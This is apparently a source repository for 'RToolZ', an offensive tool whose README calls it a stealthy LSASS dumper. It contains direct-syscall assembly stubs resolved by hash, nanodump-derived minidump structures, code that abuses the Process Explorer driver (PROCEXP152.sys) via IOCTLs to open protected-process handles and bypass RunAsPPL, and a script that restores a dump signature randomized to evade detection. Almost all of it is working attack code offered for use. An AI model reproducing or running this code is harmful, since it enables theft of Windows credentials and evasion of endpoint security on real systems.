	 and rcx, 7 ; assign and operand on rcx to zero out the remaining bytes
	 rep movsb ; loop on them
	 mov rsi, r11 ; restore registers
	 mov rdi, r10
	 ret
besomemcpy_fast ENDP

_NtOpenProcess PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0CC57D5FBh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtOpenProcess ENDP


_NtCreateProcessEx PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0818C35B3h        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtCreateProcessEx ENDP


_NtOpenProcessToken PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 04B9D348Ch        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtOpenProcessToken ENDP


_NtGetNextProcess PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0C558DCF4h        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtGetNextProcess ENDP

_NtQueryInformationProcess PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0C2BCDD50h        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtQueryInformationProcess ENDP


_NtQueryVirtualMemory PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 00597715Bh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtQueryVirtualMemory ENDP


_NtAdjustPrivilegesToken PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0858DD14Fh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtAdjustPrivilegesToken ENDP


_NtAllocateVirtualMemory PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0C358FDDFh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtAllocateVirtualMemory ENDP


_NtFreeVirtualMemory PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 043AD294Fh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtFreeVirtualMemory ENDP


_NtCreateFile PROC
 	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 02C9BA68Eh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtCreateFile ENDP


_NtWriteFile PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0E879BA4Eh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtWriteFile ENDP

_NtReadVirtualMemory PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 057D3575Bh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtReadVirtualMemory ENDP


_NtClose PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0CE97C93Dh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtClose ENDP


_NtCreateThreadEx  PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0dc411216h        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtCreateThreadEx ENDP

_NtGetContextThread   PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0340f3ea1h        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtGetContextThread  ENDP

_NtDelayExecution   PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0850d9a84h        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtDelayExecution  ENDP

_NtResumeThread   PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 07eda3c7bh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtResumeThread  ENDP

_NtSetContextThread  PROC
	push rcx          ; Save registers.
	push rdx
	push r8
	push r9
	sub rsp, 28h
	mov ecx, 0b4acfa7eh        ; Load function hash into ECX.
	call OB97_GetNumber  ; Resolve function hash into syscall number.
	add rsp, 28h
	pop r9          ; Restore registers.
	pop r8
	pop rdx
	pop rcx
	mov r10, rcx
	syscall                    ; Invoke system call.
	ret
_NtSetContextThread ENDP

end
```

`OmriRToolZ/include/nanodump.h`:

```h
#pragma once

#include <windows.h>

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define ARRAY_SIZE(a) (sizeof(a)/sizeof((a)[0]))
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define STATUS_PARTIAL_COPY 0x8000000D
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_OBJECT_PATH_NOT_FOUND 0xC000003A
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define STATUS_INVALID_CID 0xC000000B

#define CALLBACK_FILE       0x02
#define CALLBACK_FILE_WRITE 0x08
#define CALLBACK_FILE_CLOSE 0x09

#define MEM_COMMIT 0x1000
//#define MEM_IMAGE 0x1000000
#define MEM_MAPPED 0x40000
#define PAGE_NOACCESS 0x01
#define PAGE_GUARD 0x100

// 70 MiB
#define DUMP_MAX_SIZE 0x4600000
// 900 KiB
#define CHUNK_SIZE 0xe1000

#ifndef _WIN64
// x86 has conflicting types with these functions
#define NtClose _NtClose
#define NtQueryInformationProcess _NtQueryInformationProcess
#define NtCreateFile _NtCreateFile
#endif

#ifdef _WIN64
#define PEB_OFFSET 0x60
#define READ_MEMLOC __readgsqword
#else
#define PEB_OFFSET 0x30
#define READ_MEMLOC __readfsdword
#endif

#define intAlloc(size) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, addr)

#ifdef BOF

WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI void * WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL WINAPI KERNEL32$HeapFree (HANDLE, DWORD, PVOID);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError (VOID);

WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW (LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);

WINBASEAPI char *__cdecl MSVCRT$strrchr(const char *_Str,int _Ch);
WINBASEAPI void * __cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
WINBASEAPI size_t __cdecl MSVCRT$strnlen(const char *s, size_t maxlen);
WINBASEAPI size_t __cdecl MSVCRT$wcsnlen(const wchar_t *_Src,size_t _MaxCount);
WINBASEAPI wchar_t * __cdecl MSVCRT$wcscpy(wchar_t * __restrict__ __dst, const wchar_t * __restrict__ __src);
WINBASEAPI size_t __cdecl MSVCRT$mbstowcs(wchar_t * __restrict__ _Dest,const char * __restrict__ _Source,size_t _MaxCount);
WINBASEAPI wchar_t * __cdecl MSVCRT$wcsncat(wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source,size_t _Count);
WINBASEAPI int    __cdecl MSVCRT$strncmp(const char *s1, const char *s2, size_t n);
WINBASEAPI int __cdecl MSVCRT$_wcsicmp(const wchar_t *_Str1,const wchar_t *_Str2);
WINBASEAPI void WINAPI MSVCRT$srand(int initial);
WINBASEAPI int WINAPI MSVCRT$rand();
WINBASEAPI time_t WINAPI MSVCRT$time(time_t *time);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);

#else

#define KERNEL32$GetProcessHeap GetProcessHeap
#define KERNEL32$HeapAlloc HeapAlloc
#define KERNEL32$HeapFree HeapFree
#define KERNEL32$GetLastError GetLastError

#define ADVAPI32$LookupPrivilegeValueW LookupPrivilegeValueW

#define MSVCRT$strrchr strrchr
#define MSVCRT$strnlen strnlen
#define MSVCRT$wcsnlen wcsnlen
#define MSVCRT$wcscpy wcscpy
#define MSVCRT$mbstowcs mbstowcs
#define MSVCRT$wcsncat wcsncat
#define MSVCRT$strncmp strncmp
#define MSVCRT$_wcsicmp _wcsicmp
#define MSVCRT$srand srand
#define MSVCRT$rand rand
#define MSVCRT$time time
#define MSVCRT$memset memset

#endif

struct MiniDumpHeader
{
     ULONG32       Signature;
     SHORT         Version;
     SHORT         ImplementationVersion;
     ULONG32       NumberOfStreams;
     ULONG32       StreamDirectoryRva;
     ULONG32       CheckSum;
     ULONG32       Reserved;
     ULONG32       TimeDateStamp;
     ULONG32       Flags;
};

struct MiniDumpDirectory
{
     ULONG32       StreamType;
     ULONG32       DataSize;
     ULONG32       Rva;
};

struct dump_context
{
    HANDLE  hProcess;
    void*   BaseAddress;
    ULONG32 rva;
    char*   signature;
};

struct MiniDumpSystemInfo
{
    SHORT ProcessorArchitecture;
    SHORT ProcessorLevel;
    SHORT ProcessorRevision;
    char    NumberOfProcessors;
    char    ProductType;
    ULONG32 MajorVersion;
    ULONG32 MinorVersion;
    ULONG32 BuildNumber;
    ULONG32 PlatformId;
    ULONG32 CSDVersionRva;
    SHORT SuiteMask;
    SHORT Reserved2;
#if _WIN64
        ULONG64 ProcessorFeatures1;
        ULONG64 ProcessorFeatures2;
#else
        ULONG32 VendorId1;
        ULONG32 VendorId2;
        ULONG32 VendorId3;
        ULONG32 VersionInformation;
        ULONG32 FeatureInformation;
        ULONG32 AMDExtendedCpuFeatures;
#endif
};

struct LDR_DATA_TABLE_ENTRY
{
    //struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
    struct _LIST_ENTRY InMemoryOrderLinks;                                  //0x10
    struct _LIST_ENTRY InInitializationOrderLinks;                          //0x20
    PVOID DllBase;                                                          //0x30
    PVOID EntryPoint;                                                       //0x38
    ULONG32 SizeOfImage;                                                      //0x40
    struct _UNICODE_STRING FullDllName;                                     //0x48
    struct _UNICODE_STRING BaseDllName;                                     //0x58
};

struct module_info
{
    struct module_info* next;
    PVOID dll_base;
    ULONG32 size_of_image;
    char dll_name[256];
    ULONG32 name_rva;
};

struct VsFixedFileInfo
{
    ULONG32 dwSignature;
    ULONG32 dwStrucVersion;
    ULONG32 dwFileVersionMS;
    ULONG32 dwFileVersionLS;
    ULONG32 dwProductVersionMS;
    ULONG32 dwProductVersionLS;
    ULONG32 dwFileFlagsMask;
    ULONG32 dwFileFlags;
    ULONG32 dwFileOS;
    ULONG32 dwFileType;
    ULONG32 dwFileSubtype;
    ULONG32 dwFileDateMS;
    ULONG32 dwFileDateLS;
};

struct MiniDumpLocationDescriptor
{
    ULONG32 DataSize;
    ULONG32 rva;
};

struct MiniDumpModule
{
    ULONG64 BaseOfImage;
    ULONG32 SizeOfImage;
    ULONG32 CheckSum;
    ULONG32 TimeDateStamp;
    ULONG32 ModuleNameRva;
    struct VsFixedFileInfo VersionInfo;
    struct MiniDumpLocationDescriptor CvRecord;
    struct MiniDumpLocationDescriptor MiscRecord;
    ULONG64 Reserved0;
    ULONG64 Reserved1;
};

struct MiniDumpMemoryDescriptor64
{
    struct MiniDumpMemoryDescriptor64* next;
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
};

struct linked_list
{
    struct linked_list* next;
};

```

`OmriRToolZ/include/syscalls.h`:

```h
#pragma once

#include <windows.h>
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifndef InitializeObjectAttributes

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#endif
typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		VOID*    Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef enum _MEMORY_INFORMATION_CLASS
{
	MemoryBasicInformation,
	MemoryWorkingSetInformation,
	MemoryMappedFilenameInformation,
	MemoryRegionInformation,
	MemoryWorkingSetExInformation,
	MemorySharedCommitInformation,
	MemoryImageInformation,
	MemoryRegionInformationEx,
	MemoryPrivilegedBasicInformation,
	MemoryEnclaveImageInformation,
	MemoryBasicInformationCapped
} MEMORY_INFORMATION_CLASS, *PMEMORY_INFORMATION_CLASS;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef enum _PROCESSINFOCLASS
{
	ProcessBasicInformation = 0,
	ProcessDebugPort = 7,
	ProcessWow64Information = 26,
	ProcessImageFileName = 27,
	ProcessBreakOnTermination = 29
} PROCESSINFOCLASS, *PPROCESSINFOCLASS;

typedef VOID(NTAPI* PIO_APC_ROUTINE) (
	IN PVOID            ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG            Reserved);


typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS _NtOpenProcess(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL);

EXTERN_C NTSTATUS _NtGetNextProcess(
	IN HANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN ULONG HandleAttributes,
	IN ULONG Flags,
	OUT PHANDLE NewProcessHandle);

EXTERN_C NTSTATUS _NtReadVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress OPTIONAL,
	OUT PVOID Buffer,
	IN SIZE_T BufferSize,
	OUT PSIZE_T NumberOfBytesRead OPTIONAL);

EXTERN_C NTSTATUS _NtClose(
	IN HANDLE Handle);

EXTERN_C NTSTATUS _NtOpenProcessToken(
	IN HANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	OUT PHANDLE TokenHandle);

EXTERN_C NTSTATUS _NtQueryInformationProcess(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL);

EXTERN_C NTSTATUS _NtQueryVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN MEMORY_INFORMATION_CLASS MemoryInformationClass,
	OUT PVOID MemoryInformation,
	IN SIZE_T MemoryInformationLength,
	OUT PSIZE_T ReturnLength OPTIONAL);

EXTERN_C NTSTATUS _NtAdjustPrivilegesToken(
	IN HANDLE TokenHandle,
	IN BOOLEAN DisableAllPrivileges,
	IN PTOKEN_PRIVILEGES NewState OPTIONAL,
	IN ULONG BufferLength,
	OUT PTOKEN_PRIVILEGES PreviousState OPTIONAL,
	OUT PULONG ReturnLength OPTIONAL);

EXTERN_C NTSTATUS _NtAllocateVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID * BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect);

EXTERN_C NTSTATUS _NtFreeVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG FreeType);

EXTERN_C NTSTATUS _NtCreateFile(
	OUT PHANDLE FileHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PLARGE_INTEGER AllocationSize OPTIONAL,
	IN ULONG FileAttributes,
	IN ULONG ShareAccess,
	IN ULONG CreateDisposition,
	IN ULONG CreateOptions,
	IN PVOID EaBuffer OPTIONAL,
	IN ULONG EaLength);

EXTERN_C NTSTATUS _NtWriteFile(
	IN HANDLE FileHandle,
	IN HANDLE Event OPTIONAL,
	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	IN PVOID Buffer,
	IN ULONG Length,
	IN PLARGE_INTEGER ByteOffset OPTIONAL,
	IN PULONG Key OPTIONAL);

EXTERN_C NTSTATUS _NtCreateProcessEx(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ParentProcess,
	IN ULONG Flags,
	IN HANDLE SectionHandle OPTIONAL,
	IN HANDLE DebugPort OPTIONAL,
	IN HANDLE ExceptionPort OPTIONAL,
	IN ULONG JobMemberLevel);


EXTERN_C NTSTATUS _NtGetContextThread(
	IN HANDLE ThreadHandle,
	IN OUT PCONTEXT ThreadContext);

EXTERN_C NTSTATUS _NtSetContextThread(
	IN HANDLE ThreadHandle,
	IN PCONTEXT Context);

EXTERN_C NTSTATUS _NtResumeThread(
	IN HANDLE ThreadHandle,
	IN OUT PULONG PreviousSuspendCount OPTIONAL);

EXTERN_C NTSTATUS _NtDelayExecution(
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER DelayInterval);


EXTERN_C NTSTATUS _NtCreateThreadEx(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ProcessHandle,
	IN PVOID StartRoutine,
	IN PVOID Argument OPTIONAL,
	IN ULONG CreateFlags,
	IN SIZE_T ZeroBits,
	IN SIZE_T StackSize,
	IN SIZE_T MaximumStackSize,
	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C void besomemcpy_fast(void* DestBuffer, void* SourceBuffer, int size_of_buffer);

EXTERN_C void besomemset_stosb(void* dest, int c, size_t count);
```

`OmriRToolZ/ppl_bypass_driver.cpp`:

```cpp
#include "ppl_bypass_driver.h"

typedef struct procexp_close_handle {
	ULONGLONG pPid = 0x0;
	PVOID ObjectType;
	ULONGLONG nothing2 = 0x0;
	ULONGLONG handle;
} Procexp_close, * pProcexp_close;


/*Creates the handle to the driver object*/
HANDLE hProcExpDevice;


EXTERN_C HANDLE open_driver()
{
	hProcExpDevice = CreateFileA("\\\\.\\PROCEXP152", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hProcExpDevice == INVALID_HANDLE_VALUE)
	{
		printf("Unable to open driver handle, Error code:%d\n", GetLastError());
		return 0;
	}
	else {
		printf("HANDLE %p\n", hProcExpDevice);
	}
	return hProcExpDevice;
}

/*Opens handle to a protected process*/
EXTERN_C HANDLE open_handle(ULONGLONG processPid, HANDLE hProcExpDevice)
{
	HANDLE hProtectedProcess = NULL;
	DWORD dwBytesReturned = 0;
	BOOL ret = FALSE;
	char* endptr = 0;

	ret = DeviceIoControl(hProcExpDevice, IOCTL_OPEN_PROTECTED_PROCESS_HANDLE, (LPVOID)&processPid, sizeof(processPid),
		&hProtectedProcess,
		sizeof(HANDLE),
		&dwBytesReturned,
		NULL);


	if (dwBytesReturned == 0 || !ret)
	{
		printf("Protected process opening error: %d\n", GetLastError());
		return 0;
	}

	return hProtectedProcess;
}
```

`OmriRToolZ/ppl_bypass_driver.h`:

```h
#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <psapi.h>
#include <winternl.h>
//#include <TlHelp32.h>
//#include <DbgHelp.h>


/*IOCTL to interrogate procexp driver*/
#define IOCTL_OPEN_PROTECTED_PROCESS_HANDLE 0x8335003c 
#define IOCTL_DUPLICATE_TOKEN 0x8335000c
#define IOCTL_CLOSE_HANDLE 0x83350004

/*Ask about protection of process*/
#define ProcessProtectionInformation 0x61

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

/*Define Errors NT_SUCCESS and so*/
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1


typedef enum _PS_PROTECTED_TYPE : UCHAR
{
    PsProtectedTypeNone,
    PsProtectedTypeProtectedLight,
    PsProtectedTypeProtected,
    PsProtectedTypeMax
} PS_PROTECTED_TYPE;

typedef enum _PS_PROTECTED_SIGNER : UCHAR
{
    PsProtectedSignerNone,
    PsProtectedSignerAuthenticode,
    PsProtectedSignerCodeGen,
    PsProtectedSignerAntimalware,
    PsProtectedSignerLsa,
    PsProtectedSignerWindows,
    PsProtectedSignerWinTcb,
    PsProtectedSignerWinSystem,
    PsProtectedSignerApp,
    PsProtectedSignerMax
} PS_PROTECTED_SIGNER;

typedef struct _PS_PROTECTION
{
    union
    {
        struct
        {
            PS_PROTECTED_TYPE Type : 3;
            BOOLEAN Audit : 1;
            PS_PROTECTED_SIGNER Signer : 4;
        } s;
        UCHAR Level;
    };
} PS_PROTECTION, * PPS_PROTECTION;
//
/*Protection codes*/

/*Define NtQuerySystemInformation*/
using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONGLONG SystemInformationClass,
    PVOID SystemInformation,
    ULONGLONG SystemInformationLength,
    PULONGLONG ReturnLength
    );

/*Define NtQueryProcessInformation*/

using fNtQueryProcessInformation = NTSTATUS(WINAPI*)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );
// handle information
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT Handle;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// handle table information
typedef struct _SYSTEM_HANDLE_INFORMATION
{
    long NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;



```

`OmriRToolZ/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Resource.rc
//
#define IDI_ICON1                       108

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        109
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`README.md`:

```md
# RToolZ
A Stealthy Lsass Dumper - can abuse ProcExp152.sys driver to dump PPL Lsass.  
# What Is So Special About It?
No calls to MiniDump or any dbghelp.lib methods, all of the dumping process is done MANUALLY by the dumper while reducing the dump size to minimal by removing unessacery DLLs.  

# Methods & How to use 
  
The OmriToolZ have 3 methods to dump lsass:  
1. The first method is simply using direct syscalls to get an lsass handle.  
2. The second method, an handle to lsass is being requested with the `PROCESS_CREATE_PROCESS` permissions, create a new process in the name of lsass and forks the new process in order to get `PROCESS_ALL_ACCESS` to lsass.exe (some kind of handle privilege escaltion).  
3. The third method can only work with `PROCEXP152.sys` DRIVER loaded, this method will obtain an HANDLE to the driver and abuse it to get an handle on the LSASS.exe process  
this can be used to bypass `"RunAsPPL"` lsass defense.   

#### Flags:
----------------------------------------------------------------
`--valid` - flag will be used to generate a dump without randomizing the signiture, if it is not used you must use the restore_signature.sh script.  
`--write` - specifies the path where you throw the dump into the disk.  
`-m` - specifies the methods listed above.  
`-p` - the PID of lsass.exe  

# Credits
1. Some of the code was taken and modified from the https://github.com/helpsystems/nanodump project.



```

`restore_signature.sh`:

```sh
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <dumpfile>"
    exit 1
fi

if [ ! -f "$1" ]; then
    echo "the file '$1' does not exist."
    exit 1
fi

# restore the Signature -> PMDM
printf 'MDMP' | dd of=$1 bs=1 seek=0 count=4 conv=notrunc &>/dev/null

if [ $? -ne 0  ]; then
    echo "could not write to the file '$1'"
    exit 1
fi

# restore the Version -> 42899
printf '\xa7\x93' | dd of=$1 bs=1 seek=4 count=2 conv=notrunc &>/dev/null

if [ $? -ne 0  ]; then
    echo "could not write to the file '$1'"
    exit 1
fi

# restore the ImplementationVersion -> 0
printf '\x00\x00' | dd of=$1 bs=1 seek=6 count=2 conv=notrunc &>/dev/null

if [ $? -ne 0  ]; then
    echo "could not write to the file '$1'"
    exit 1
fi

echo "done!"

```